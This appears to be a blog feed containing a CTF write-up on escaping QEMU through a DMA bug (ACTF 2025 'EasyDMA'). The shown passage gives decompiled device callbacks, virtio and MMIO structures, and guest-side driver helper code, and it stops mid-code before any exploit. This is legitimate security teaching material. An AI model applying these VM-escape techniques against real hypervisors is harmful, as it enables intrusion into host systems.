<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>蘅芷清芬</title>
  
  
  <link href="http://summ2.link/atom.xml" rel="self"/>
  
  <link href="http://summ2.link/"/>
  <updated>2025-05-20T09:56:49.404Z</updated>
  <id>http://summ2.link/</id>
  
  <author>
    <name>summ2</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>QEMU PWN - EasyDMA</title>
    <link href="http://summ2.link/categories/CTF/easydma/"/>
    <id>http://summ2.link/categories/CTF/easydma/</id>
    <published>2025-05-07T16:00:00.000Z</published>
    <updated>2025-05-20T09:56:49.404Z</updated>
    
    <content type="html"><![CDATA[<h1 id="easydma">EasyDMA</h1><p>From: ACTF 2025</p><p>题目给出一个去符号的 qemu 二进制文件<code>qemu-system-x86_64</code>，启动参数如下</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">timeout</span> --foreground 300 ./qemu-system-x86_64 \</span><br><span class="line">    -L pc-bios \</span><br><span class="line">    -m 1024 \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -initrd rootfs.cpio \</span><br><span class="line">    -drive file=null-co://,<span class="keyword">if</span>=none,<span class="built_in">id</span>=mydisk \</span><br><span class="line">    -device virtio-blk-pci,drive=mydisk,ioeventfd=off \</span><br><span class="line">    -device readflag \</span><br><span class="line">    -append <span class="string">"priority=low console=ttyS0"</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -nographic</span><br></pre></td></tr></tbody></table></figure><span id="more"></span><p>添加两个设备 <code>virtio-blk-pci</code>, <code>readflag</code>。</p><p>反汇编可以找到 <code>readflag</code> 通过 <code>mmio</code> 的读、写回调函数：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">readflag_mmio_read</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">int</span> size)</span></span><br><span class="line">{</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( addr &gt; <span class="number">0x7F</span> )</span><br><span class="line">  {</span><br><span class="line">    result = <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( size != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( size != <span class="number">4</span> )</span><br><span class="line">  {</span><br><span class="line">    result = <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( size != <span class="number">8</span> )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  }</span><br><span class="line">  result = <span class="number">0xDEADBEEFL</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( addr )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">      <span class="keyword">return</span> *(_QWORD *)(opaque + <span class="number">2984</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">readflag_mmio_write</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">size_t</span> val, <span class="type">int</span> size)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// rbp</span></span><br><span class="line">  FILE *v5; <span class="comment">// rax</span></span><br><span class="line">  FILE *v6; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">size_t</span> v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( addr &gt; <span class="number">0x7F</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( size != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( size != <span class="number">4</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( size == <span class="number">8</span> &amp;&amp; addr == <span class="number">8</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( addr )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">LABEL_6:</span><br><span class="line">      *(_QWORD *)(opaque + <span class="number">2984</span>) = val;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( val &lt;= <span class="number">0xFFF</span> )</span><br><span class="line">  {</span><br><span class="line">    v8 = val;</span><br><span class="line">    v4 = <span class="built_in">malloc</span>(val);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    {</span><br><span class="line">      v5 = fopen64(<span class="string">"flag"</span>, <span class="string">"r"</span>);</span><br><span class="line">      v6 = v5;</span><br><span class="line">      <span class="keyword">if</span> ( v5 )</span><br><span class="line">      {</span><br><span class="line">        v7 = fread(v4, <span class="number">1uLL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(v8 - <span class="number">1</span>), v5);</span><br><span class="line">        <span class="keyword">if</span> ( v7 )</span><br><span class="line">          *((_BYTE *)v4 + v7) = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"No data read from the file."</span>);</span><br><span class="line">        <span class="built_in">free</span>(v4);</span><br><span class="line">        fclose(v6);</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        perror(<span class="string">"Error opening file"</span>);</span><br><span class="line">        <span class="built_in">free</span>(v4);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      perror(<span class="string">"Memory allocation failed"</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="virtio-block-device1">Virtio Block Device<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a></h1><h2 id="data-types-definition">Data types definition</h2><p>For the integer data types used in the structure definitions, thefollowing conventions are used:</p><ul><li><p><strong>u8, u16, u32, u64</strong></p><p>An unsigned integer of the specified length in bits.</p></li><li><p><strong>le16, le32, le64</strong></p><p>An unsigned integer of the specified length in bits, in little-endianbyte order.</p></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> u8 uint8_t</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> u16 uint16_t</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> u32 uint32_t</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> u64 uint64_t</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> le16 u16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> le32 u32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> le64 u64</span></span><br></pre></td></tr></tbody></table></figure><h2 id="pci-capabilities">PCI Capabilities</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_cap</span> {</span></span><br><span class="line">    u8 cap_vndr; <span class="comment">/* Generic PCI field: PCI_CAP_ID_VNDR */</span></span><br><span class="line">    u8 cap_next; <span class="comment">/* Generic PCI field: next ptr. */</span></span><br><span class="line">    u8 cap_len; <span class="comment">/* Generic PCI field: capability length */</span></span><br><span class="line">    u8 cfg_type; <span class="comment">/* Identifies the structure. */</span></span><br><span class="line">    u8 bar; <span class="comment">/* Where to find it. */</span></span><br><span class="line">    u8 id; <span class="comment">/* Multiple capabilities of the same type */</span></span><br><span class="line">    u8 padding[<span class="number">2</span>]; <span class="comment">/* Pad to full dword. */</span></span><br><span class="line">    le32 offset; <span class="comment">/* Offset within bar. */</span></span><br><span class="line">    le32 length; <span class="comment">/* Length of the structure, in bytes. */</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p><strong><em>cfg_type</em></strong> identifies the structure,according to the following table:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Common configuration */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_PCI_CAP_COMMON_CFG 1</span></span><br><span class="line"><span class="comment">/* Notifications */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_PCI_CAP_NOTIFY_CFG 2</span></span><br><span class="line"><span class="comment">/* ISR Status */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_PCI_CAP_ISR_CFG 3</span></span><br><span class="line"><span class="comment">/* Device specific configuration */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_PCI_CAP_DEVICE_CFG 4</span></span><br><span class="line"><span class="comment">/* PCI configuration access */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_PCI_CAP_PCI_CFG 5</span></span><br><span class="line"><span class="comment">/* Shared memory region */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_PCI_CAP_SHARED_MEMORY_CFG 8</span></span><br><span class="line"><span class="comment">/* Vendor-specific data */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_PCI_CAP_VENDOR_CFG 9</span></span><br></pre></td></tr></tbody></table></figure><p>For <strong><em>common configuration</em></strong>, its layout isbelow:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_common_cfg</span> {</span></span><br><span class="line">    <span class="comment">/* About the whole device. */</span></span><br><span class="line">    le32 device_feature_select; <span class="comment">/* read-write */</span></span><br><span class="line">    le32 device_feature; <span class="comment">/* read-only for driver */</span></span><br><span class="line">    le32 driver_feature_select; <span class="comment">/* read-write */</span></span><br><span class="line">    le32 driver_feature; <span class="comment">/* read-write */</span></span><br><span class="line">    le16 config_msix_vector; <span class="comment">/* read-write */</span></span><br><span class="line">    le16 num_queues; <span class="comment">/* read-only for driver */</span></span><br><span class="line">    u8 device_status; <span class="comment">/* read-write */</span></span><br><span class="line">    u8 config_generation; <span class="comment">/* read-only for driver */</span></span><br><span class="line">    <span class="comment">/* About a specific virtqueue. */</span></span><br><span class="line">    le16 queue_select; <span class="comment">/* read-write */</span></span><br><span class="line">    le16 queue_size; <span class="comment">/* read-write */</span></span><br><span class="line">    le16 queue_msix_vector; <span class="comment">/* read-write */</span></span><br><span class="line">    le16 queue_enable; <span class="comment">/* read-write */</span></span><br><span class="line">    le16 queue_notify_off; <span class="comment">/* read-only for driver */</span></span><br><span class="line">    le64 queue_desc; <span class="comment">/* read-write */</span></span><br><span class="line">    le64 queue_driver; <span class="comment">/* read-write */</span></span><br><span class="line">    le64 queue_device; <span class="comment">/* read-write */</span></span><br><span class="line">    le16 queue_notif_config_data; <span class="comment">/* read-only for driver */</span></span><br><span class="line">    le16 queue_reset; <span class="comment">/* read-write */</span></span><br><span class="line">    <span class="comment">/* About the administration virtqueue. */</span></span><br><span class="line">    le16 admin_queue_index; <span class="comment">/* read-only for driver */</span></span><br><span class="line">    le16 admin_queue_num; <span class="comment">/* read-only for driver */</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>For <strong><em>notification</em></strong>, its layout is below:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_notify_cap</span> {</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_cap</span> <span class="title">cap</span>;</span></span><br><span class="line"><span class="class">    <span class="title">le32</span> <span class="title">notify_off_multiplier</span>; /* <span class="title">Multiplier</span> <span class="title">for</span> <span class="title">queue_notify_off</span>. */</span></span><br><span class="line"><span class="class">};</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></tbody></table></figure><p>We recognize these type, and record the offset.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">print_cap</span><span class="params">(<span class="keyword">struct</span> virtio_pci_cap* cap)</span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"cap_len: %x\n"</span>, cap-&gt;cap_len);</span><br><span class="line">    <span class="keyword">switch</span>(cap-&gt;cfg_type){</span><br><span class="line">        <span class="keyword">case</span> VIRTIO_PCI_CAP_COMMON_CFG:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"cfg_type: common\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> VIRTIO_PCI_CAP_NOTIFY_CFG:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"cfg_type: notify\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> VIRTIO_PCI_CAP_ISR_CFG:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"cfg_type: isr\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> VIRTIO_PCI_CAP_DEVICE_CFG:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"cfg_type: device\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> VIRTIO_PCI_CAP_PCI_CFG:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"cfg_type: pci\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> VIRTIO_PCI_CAP_SHARED_MEMORY:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"cfg_type: shared memory\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> VIRTIO_PCI_CAP_VENDOR_CFG:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"cfg_type: vendor\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"cfg_type: unknown\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"bar: %x\n"</span>, cap-&gt;bar);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"id: %x\n"</span>, cap-&gt;id);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"offset: %x\n"</span>, cap-&gt;offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"length: %x\n"</span>, cap-&gt;length);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(cap.cfg_type){</span><br><span class="line">            <span class="keyword">case</span> VIRTIO_PCI_CAP_COMMON_CFG:</span><br><span class="line">                virtio_common_mmio = virtio_mmio + cap.offset;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> VIRTIO_PCI_CAP_NOTIFY_CFG:</span><br><span class="line">                virtio_notify_mmio = (<span class="keyword">struct</span> virtio_notify_cfg*)((<span class="type">size_t</span>)virtio_mmio + cap.offset);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> VIRTIO_PCI_CAP_ISR_CFG:</span><br><span class="line">                virtio_isr_mmio = virtio_mmio + cap.offset;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> VIRTIO_PCI_CAP_DEVICE_CFG:</span><br><span class="line">                virtio_device_mmio = virtio_mmio + cap.offset;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        }</span><br></pre></td></tr></tbody></table></figure><h2 id="virtqueue2">Virtqueue<a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a></h2><p>The mechanism for bulk data transport on virtio devices ispretentiously called a virtqueue. Each device can have zero or morevirtqueues.</p><p>Each virtqueue can consist of up to 3 parts:</p><p>​ • Descriptor Area - used for describing buffers</p><p>​ • Driver Area - extra data supplied by driver to the device. Alsocalled avail virtqueue.</p><p>​ • Device Area - extra data supplied by device to driver. Also calledused virtqueue.</p><figure><img src="\202558-QEMU-PWN---EasyDMA/2020-07-08-virtio-fig1.png" alt="Shared memory with split ring elements"><figcaption aria-hidden="true">Shared memory with split ringelements</figcaption></figure><p>There areas structure defined below:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtq_desc</span> {</span></span><br><span class="line">    <span class="comment">/* Address (guest-physical). */</span></span><br><span class="line">    le64 addr;</span><br><span class="line">    <span class="comment">/* Length. */</span></span><br><span class="line">    le32 len;</span><br><span class="line"><span class="comment">/* This marks a buffer as continuing via the next field. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTQ_DESC_F_NEXT 1</span></span><br><span class="line"><span class="comment">/* This marks a buffer as device write-only (otherwise device read-only). */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTQ_DESC_F_WRITE 2</span></span><br><span class="line"><span class="comment">/* This means the buffer contains a list of buffer descriptors. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTQ_DESC_F_INDIRECT 4</span></span><br><span class="line">    <span class="comment">/* The flags as indicated above. */</span></span><br><span class="line">    le16 flags;</span><br><span class="line">    <span class="comment">/* Next field if flags &amp; NEXT */</span></span><br><span class="line">    le16 next;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtq_avail</span> {</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTQ_AVAIL_F_NO_INTERRUPT 1</span></span><br><span class="line">    le16 flags;</span><br><span class="line">    le16 idx;</span><br><span class="line">    le16 ring[VIRTIO_QUEUE_SIZE];</span><br><span class="line">    le16 used_event; <span class="comment">/* Only if VIRTIO_F_EVENT_IDX */</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtq_used_elem</span> {</span></span><br><span class="line">    <span class="comment">/* Index of start of used descriptor chain. */</span></span><br><span class="line">    le32 id;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * The number of bytes written into the device writable portion of</span></span><br><span class="line"><span class="comment">    * the buffer described by the descriptor chain.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    le32 len;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtq_used</span> {</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTQ_USED_F_NO_NOTIFY 1</span></span><br><span class="line">    le16 flags;</span><br><span class="line">    le16 idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">virtq_used_elem</span> <span class="title">ring</span>[<span class="title">VIRTIO_QUEUE_SIZE</span>];</span></span><br><span class="line">    le16 avail_event; <span class="comment">/* Only if VIRTIO_F_EVENT_IDX */</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><hr><p>The driver queues requests to the virtqueue, the type of the requestis either a read (VIRTIO_BLK_T_IN), a write (VIRTIO_BLK_T_OUT), adiscard (VIRTIO_BLK_T_DISCARD), a write zeroes(VIRTIO_BLK_T_WRITE_ZEROES) or a flush (VIRTIO_BLK_T_FLUSH).</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtio_blk_req</span> {</span> </span><br><span class="line">        le32 type; </span><br><span class="line">        le32 reserved; </span><br><span class="line">        le64 sector; </span><br><span class="line">        u8 data[][<span class="number">512</span>]; </span><br><span class="line">        u8 status; </span><br><span class="line">}; </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtio_blk_discard_write_zeroes</span> {</span> </span><br><span class="line">       le64 sector; </span><br><span class="line">       le32 num_sectors; </span><br><span class="line">       <span class="class"><span class="keyword">struct</span> {</span> </span><br><span class="line">               le32 unmap:<span class="number">1</span>; </span><br><span class="line">               le32 reserved:<span class="number">31</span>; </span><br><span class="line">       } flags; </span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_BLK_T_IN           0 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_BLK_T_OUT          1 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_BLK_T_FLUSH        4 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_BLK_T_DISCARD      11 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_BLK_T_WRITE_ZEROES 13</span></span><br></pre></td></tr></tbody></table></figure><h2 id="mmio3">MMIO<a href="#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a></h2><p><strong>Memory-mapped I/O</strong> (<strong>MMIO</strong>) uses thesame address space to address both main memory and I/O devices. Thememory and registers of the I/O devices are mapped to (associated with)address values, so a memory address may refer to either a portion ofphysical RAM or to memory and registers of the I/O device.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint8_t</span> <span class="title function_">mmio_read8</span><span class="params">(<span class="type">void</span>* addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint8_t</span>*)addr;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">mmio_read16</span><span class="params">(<span class="type">void</span>* addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint16_t</span>*)addr;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read32</span><span class="params">(<span class="type">void</span>* addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint32_t</span>*)addr;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title 